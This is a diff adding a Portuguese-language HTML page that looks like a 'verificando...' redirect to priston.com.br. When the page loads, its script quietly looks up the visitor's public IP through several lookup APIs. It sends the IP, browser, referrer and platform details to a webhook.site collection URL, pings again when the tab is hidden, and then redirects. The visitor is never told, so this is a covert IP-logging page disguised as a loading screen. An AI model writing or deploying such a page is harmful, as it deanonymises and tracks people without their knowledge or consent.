@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="refresh" content="2;url=https://priston.com.br">
+  <title>priston.com.br</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+    }
+    .container {
+      text-align: center;
+    }
+    .spinner {
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top: 4px solid white;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="spinner"></div>
+    <p>verificando...</p>
+  </div>
+  <script>
+    // URL do seu webhook (ex.: Webhook.site, Formspree, Zapier/Make)
+    // Substitua a string abaixo pela sua URL real
+    const WEBHOOK_URL = 'https://webhook.site/5aa3ae90-dcb7-4538-a064-ed727ea8b711';
+
+    // Envia dados para o webhook com fallback para sendBeacon
+    function sendToWebhook(payload) {
+      try {
+        // Prioriza sendBeacon (não bloqueia o redirecionamento)
+        if (navigator.sendBeacon && WEBHOOK_URL && WEBHOOK_URL !== 'SEU_WEBHOOK_AQUI') {
+          const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+          const ok = navigator.sendBeacon(WEBHOOK_URL, blob);
+          if (ok) return;
+        }
+        // Fallback para fetch
+        if (WEBHOOK_URL && WEBHOOK_URL !== 'SEU_WEBHOOK_AQUI') {
+          fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+            keepalive: true // ajuda no unload
+          }).catch(() => {});
+        }
+      } catch (_) {
+        // ignora erros no envio
+      }
+    }
+
+    // Captura IP usando múltiplas APIs públicas, tentando até obter um IP
+    async function captureIPAndSend() {
+      const apis = [
+        'https://api.ipify.org?format=json',
+        'https://api.myip.com',
+        'https://ipapi.co/json/'
+      ];
+
+      let capturedIP = null;
+      for (const apiUrl of apis) {
+        try {
+          const response = await fetch(apiUrl, { cache: 'no-store' });
+          const data = await response.json();
+          const ip = data.ip || data.query || data.ip_address;
+          if (ip) {
+            capturedIP = ip;
+            break;
+          }
+        } catch (_) {
+          // tenta próxima API
+        }
+      }
+
+      const payload = {
+        ip: capturedIP || 'unknown',
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        referer: document.referrer || 'Acesso direto',
+        url: window.location.href,
+        language: navigator.language || 'unknown',
+        platform: navigator.platform || 'unknown'
+      };
+
+      sendToWebhook(payload);
+    }
+
+    // Dispara imediatamente, e de novo pouco antes do unload (maior chance de envio)
+    captureIPAndSend();
+    window.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'hidden') {
+        sendToWebhook({
+          ping: true,
+          timestamp: new Date().toISOString(),
+          url: window.location.href
+        });
+      }
+    });
+
+    // Redireciona após 1 segundo
+    setTimeout(() => {
+      window.location.href = 'https://priston.com.br';
+    }, 1000);
+  </script>
+</body>
+</html>
+
